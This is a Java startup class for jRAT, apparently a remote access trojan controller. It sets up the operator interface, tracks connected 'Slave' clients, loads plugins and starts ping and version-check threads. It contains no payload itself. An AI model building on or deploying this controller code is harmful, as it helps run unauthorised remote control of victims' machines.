package pro.jrat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import pro.jrat.api.events.OnDisableEvent;
import pro.jrat.common.OperatingSystem;
import pro.jrat.common.Version;
import pro.jrat.extensions.Plugin;
import pro.jrat.extensions.PluginLoader;
import pro.jrat.io.Files;
import pro.jrat.settings.AbstractSettings;
import pro.jrat.settings.Settings;
import pro.jrat.settings.Theme;
import pro.jrat.threads.ThreadCheckVersion;
import pro.jrat.threads.ThreadPing;
import pro.jrat.ui.frames.Frame;
import pro.jrat.ui.frames.FrameAd;
import pro.jrat.ui.frames.FrameEULA;
import pro.jrat.utils.TrayIconUtils;


public class Main {

	public static final List<Slave> connections = new ArrayList<Slave>();

	public static boolean debug;
	public static Frame instance;

	public static void main(String[] args) throws Exception {
		System.out.println("System Unique ID: " + UniqueId.getTextual());
		debug = argsContains(args, "-debug");
		
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			System.setProperty("apple.laf.useScreenMenuBar", "true");
		}
		
		try {
			Theme.getGlobal().load();
			UIManager.setLookAndFeel(Theme.getGlobal().getTheme());
		} catch (Exception ex) {
			Main.debug("Could not use look and feel, setting default");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		if (isRunningFromHomeDir()) {
			JOptionPane.showMessageDialog(null, "Could not find /settings/ or /files/, please specify your jRAT directory", "jRAT", JOptionPane.WARNING_MESSAGE);
			JFileChooser chooser = new JFileChooser();
			chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
			chooser.showOpenDialog(null);
			
			File file = chooser.getSelectedFile();
			
			if (file != null) {
				System.setProperty("user.dir", file.getAbsolutePath());
			}
		}
		
		System.setProperty("jrat.dir", System.getProperty("user.dir"));
		System.setProperty("jrat.version", Version.getVersion());
		
		try {
			PluginLoader.loadAPI();
			PluginLoader.loadPlugins();
		} catch (Exception e) {
			e.printStackTrace();
		}			
		
		instance = new Frame();
		
		AbstractSettings.loadAllGlobals();

		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
		if (!showEULA) {
			FrameEULA frame = new FrameEULA(false);
			frame.setVisible(true);
		}
		
		if (!argsContains(args, "-noad")) {
			FrameAd frame = new FrameAd();
			frame.setVisible(true);
		}
		
		Files.getSettings().mkdirs();
		Files.getFiles().mkdirs();
			
		new ThreadCheckVersion().start();
		new ThreadPing().start();
		
		instance.setVisible(true);
		
		TrayIconUtils.initialize();
		Sound.initialize();
		
		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				OnDisableEvent event = new OnDisableEvent();
				for (Plugin p : PluginLoader.plugins) {
					try {
						p.getMethods().get("ondisable").invoke(p.getInstance(), new Object[] { event });
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}

				AbstractSettings.saveAllGlobals();
				
				try {
					Theme.getGlobal().save();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}));
	}
	
	public static boolean argsContains(String[] args, String s) {
		for (String str : args) {
			if (str.equalsIgnoreCase(s)) {
				return true;
			}
		}
		
		return false;
	}

	public static String debug(Object s) {
		if (s == null) {
			s = "null";
		}
		System.out.println(s.toString());
		return s.toString();
	}

	public static String formatTitle() {
		return "jRAT [" + connections.size() + "] BETA " + Version.getVersion();
	}
	
	public static boolean isRunningFromHomeDir() {
		return !new File("settings/").exists() || !new File("files/").exists();
	}

}